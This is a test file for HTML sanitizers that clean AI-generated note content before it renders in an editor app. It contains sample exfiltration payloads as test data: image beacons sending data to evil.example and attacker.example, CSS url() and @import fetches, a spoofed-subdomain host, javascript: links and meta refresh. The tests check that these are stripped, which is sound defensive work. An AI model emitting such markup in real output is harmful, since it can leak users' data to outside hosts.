import { generateHTML, generateJSON, type JSONContent } from '@tiptap/core';
import { describe, expect, it } from 'vitest';

import { createSemanticExtensions } from '@knowtis/editor-schema';

import { sanitizeAiHtml, sanitizeProposalHtml } from './sanitize-ai-html';

describe('sanitizeAiHtml', () => {
  it('should strip img tags entirely', () => {
    const result = sanitizeAiHtml(
      '<p>hi</p><img src="https://evil.example/?d=secret">'
    );
    expect(result).not.toContain('<img');
    expect(result).toContain('<p>hi</p>');
  });

  it('should strip style attributes that could fire CSS fetches', () => {
    const result = sanitizeAiHtml(
      '<div style="background:url(https://evil.example/x)">text</div>'
    );
    expect(result).not.toContain('style=');
    expect(result).toContain('text');
  });

  it('should strip media and embedding tags', () => {
    const result = sanitizeAiHtml(
      '<video src="https://evil.example/v"></video><iframe src="https://evil.example"></iframe><svg><image href="https://evil.example/s"/></svg>'
    );
    expect(result).not.toContain('<video');
    expect(result).not.toContain('<iframe');
    expect(result).not.toContain('<svg');
  });

  it('should keep formatting markup and safe links', () => {
    const result = sanitizeAiHtml(
      '<h2>Title</h2><p><strong>bold</strong> and <a href="https://example.com">link</a></p><ul><li>item</li></ul>'
    );
    expect(result).toContain('<h2>Title</h2>');
    expect(result).toContain('<strong>bold</strong>');
    expect(result).toContain('href="https://example.com"');
    expect(result).toContain('<li>item</li>');
  });

  it('should strip javascript: links', () => {
    const result = sanitizeAiHtml('<a href="javascript:alert(1)">x</a>');
    expect(result).not.toContain('javascript:');
  });
});

const STORED_SRC =
  'https://iy4r311mpkfdcnup.public.blob.vercel-storage.com/notes/n1/lake.webp';

describe('sanitizeProposalHtml', () => {
  it('keeps an image figure the app stored, with its size and caption', () => {
    const html = `<figure data-image=""><img src="${STORED_SRC}" alt="lake" width="320" height="200"><figcaption>Lake</figcaption></figure>`;
    expect(sanitizeProposalHtml(html)).toBe(html);
  });

  it('keeps only the image attributes the note schema reads', () => {
    expect(
      sanitizeProposalHtml(
        `<img src="${STORED_SRC}" alt="lake" title="t" class="c" loading="lazy" referrerpolicy="unsafe-url">`
      )
    ).toBe(`<img src="${STORED_SRC}" alt="lake">`);
  });

  it.each([
    ['another host', 'https://attacker.example/collect.png'],
    [
      'another blob store',
      'https://attacker123.public.blob.vercel-storage.com/x.webp',
    ],
    ['http', 'http://iy4r311mpkfdcnup.public.blob.vercel-storage.com/x.webp'],
    [
      'the store name as a subdomain prefix',
      'https://iy4r311mpkfdcnup.public.blob.vercel-storage.com.attacker.example/x.webp',
    ],
    ['a data url', 'data:image/png;base64,AAAA'],
  ])('drops the whole figure of an image from %s', (_label, src) => {
    expect(
      sanitizeProposalHtml(
        `<p>a</p><figure data-image=""><img src="${src}" alt="x"><figcaption>cap</figcaption></figure><p>b</p>`
      )
    ).toBe('<p>a</p><p>b</p>');
  });

  it('drops a foreign image outside a figure and a figure holding no image', () => {
    expect(
      sanitizeProposalHtml(
        '<p>a<img src="https://attacker.example/collect.png"></p><figure><figcaption>cap</figcaption></figure>'
      )
    ).toBe('<p>a</p>');
  });

  it('still strips every other tag that fetches on render', () => {
    expect(
      sanitizeProposalHtml(
        '<p>a</p><video src="https://evil.example/v"></video><iframe src="https://evil.example"></iframe><div style="background:url(https://evil.example/x)">t</div>'
      )
    ).toBe('<p>a</p><div>t</div>');
  });

  it('leaves the shared AI sanitizer stripping every image', () => {
    expect(sanitizeAiHtml(`<p>a</p><img src="${STORED_SRC}" alt="lake">`)).toBe(
      '<p>a</p>'
    );
  });
});

function parse(html: string): DocumentFragment {
  const template = document.createElement('template');
  template.innerHTML = html;
  return template.content;
}

const LOADING_ELEMENTS = new Set([
  'style',
  'link',
  'meta',
  'base',
  'script',
  'object',
  'embed',
  'iframe',
  'frame',
  'svg',
  'math',
  'image',
  'img',
  'input',
  'video',
  'audio',
  'source',
  'picture',
  'track',
]);

const LOADING_ATTRIBUTES = new Set([
  'src',
  'srcset',
  'style',
  'background',
  'poster',
  'data',
  'href',
  'xlink:href',
  'action',
  'formaction',
  'ping',
]);

const LINK_TAG = 'a';

function loaders(html: string): string[] {
  return [...parse(html).querySelectorAll('*')].flatMap((element) => [
    ...(LOADING_ELEMENTS.has(element.localName) ? [element.localName] : []),
    ...[...element.attributes]
      .filter(
        (attr) =>
          LOADING_ATTRIBUTES.has(attr.name) &&
          !(attr.name === 'href' && element.localName === LINK_TAG)
      )
      .map((attr) => `${element.localName}[${attr.name}]`),
  ]);
}

const LOADING_MARKUP: Record<string, string> = {
  'a <style> importing a sheet':
    '<style>@import url(https://evil.example/s.css);</style>',
  'a <style> painting a background':
    '<style>*{background:url(https://evil.example/b.png)}</style>',
  'an image input': '<input type="image" src="https://evil.example/i.png">',
  'an <object>': '<object data="https://evil.example/o.swf"></object>',
  'an <embed>': '<embed src="https://evil.example/e.swf">',
  'an svg <image>':
    '<svg><image href="https://evil.example/s.png"></image></svg>',
  'a <math> link': '<math href="https://evil.example/m"><mi>x</mi></math>',
  'a table background':
    '<table background="https://evil.example/t.png"><tbody><tr><td>x</td></tr></tbody></table>',
  'a <link>': '<link rel="stylesheet" href="https://evil.example/l.css">',
  'a meta refresh':
    '<meta http-equiv="refresh" content="0;url=https://evil.example/r">',
};

const text = (value: string, marks?: JSONContent['marks']): JSONContent => ({
  type: 'text',
  text: value,
  ...(marks && { marks }),
});

const paragraph = (...content: JSONContent[]): JSONContent => ({
  type: 'paragraph',
  content,
});

const NOTE_BLOCKS: JSONContent[] = [
  { type: 'heading', attrs: { level: 1 }, content: [text('Title')] },
  { type: 'heading', attrs: { level: 2 }, content: [text('Section')] },
  { type: 'heading', attrs: { level: 3 }, content: [text('Detail')] },
  paragraph(
    text('bold', [{ type: 'bold' }]),
    text(' '),
    text('italic', [{ type: 'italic' }]),
    text(' '),
    text('under', [{ type: 'underline' }]),
    text(' '),
    text('struck', [{ type: 'strike' }]),
    text(' '),
    text('inline', [{ type: 'code' }]),
    text(' '),
    text('link', [
      { type: 'link', attrs: { href: 'https://example.com/doc' } },
    ]),
    text(' '),
    text('marked', [{ type: 'highlight', attrs: { color: '#fde68a' } }]),
    text(' '),
    text('2', [{ type: 'superscript' }]),
    text('i', [{ type: 'subscript' }]),
    { type: 'hardBreak' },
    text('next line')
  ),
  {
    type: 'bulletList',
    content: [
      {
        type: 'listItem',
        content: [
          paragraph(text('one')),
          {
            type: 'bulletList',
            content: [
              { type: 'listItem', content: [paragraph(text('nested'))] },
            ],
          },
        ],
      },
    ],
  },
  {
    type: 'orderedList',
    attrs: { start: 3 },
    content: [{ type: 'listItem', content: [paragraph(text('third'))] }],
  },
  {
    type: 'taskList',
    content: [
      {
        type: 'taskItem',
        attrs: { checked: true },
        content: [
          paragraph(text('done')),
          {
            type: 'taskList',
            content: [
              {
                type: 'taskItem',
                attrs: { checked: false },
                content: [paragraph(text('open'))],
              },
            ],
          },
        ],
      },
    ],
  },
  { type: 'blockquote', content: [paragraph(text('quoted'))] },
  {
    type: 'codeBlock',
    attrs: { language: 'ts' },
    content: [text('const a = 1;')],
  },
  { type: 'horizontalRule' },
  {
    type: 'table',
    content: [
      {
        type: 'tableRow',
        content: [
          {
            type: 'tableHeader',
            attrs: { colspan: 2 },
            content: [paragraph(text('head'))],
          },
        ],
      },
      {
        type: 'tableRow',
        content: [
          { type: 'tableCell', content: [paragraph(text('a'))] },
          { type: 'tableCell', content: [paragraph(text('b'))] },
        ],
      },
    ],
  },
  {
    type: 'mermaidBlock',
    attrs: { code: 'graph TD\n  A --> B', viewMode: 'preview' },
  },
];

const STORED_IMAGE_BLOCK: JSONContent = {
  type: 'image',
  attrs: { src: STORED_SRC, alt: 'lake', width: 320, height: 200 },
  content: [text('Lake')],
};

const EXTENSIONS = [...createSemanticExtensions()];

function noteHtml(blocks: JSONContent[]): string {
  return generateHTML({ type: 'doc', content: blocks }, EXTENSIONS);
}

describe.each([
  ['sanitizeAiHtml', sanitizeAiHtml, NOTE_BLOCKS],
  [
    'sanitizeProposalHtml',
    sanitizeProposalHtml,
    [...NOTE_BLOCKS, STORED_IMAGE_BLOCK],
  ],
])('%s', (_name, sanitize, blocks) => {
  it('keeps the code of a mermaid diagram, arrows included', () => {
    const code = 'graph TD\n  A[Start] --> B\n  B -.-> C';
    const block = document.createElement('div');
    block.setAttribute('data-mermaid-block', '');
    block.setAttribute('data-code', code);

    const out = parse(sanitize(block.outerHTML)).querySelector(
      'div[data-mermaid-block]'
    );

    expect(out?.getAttribute('data-code')).toBe(code);
  });

  it.each(Object.entries(LOADING_MARKUP))(
    'leaves nothing that loads out of %s',
    (_label, markup) => {
      expect(loaders(sanitize(`<p>before</p>${markup}<p>after</p>`))).toEqual(
        []
      );
    }
  );

  it('keeps every construct a note can hold', () => {
    const html = noteHtml(blocks);

    expect(generateJSON(sanitize(html), EXTENSIONS)).toEqual(
      generateJSON(html, EXTENSIONS)
    );
  });
});
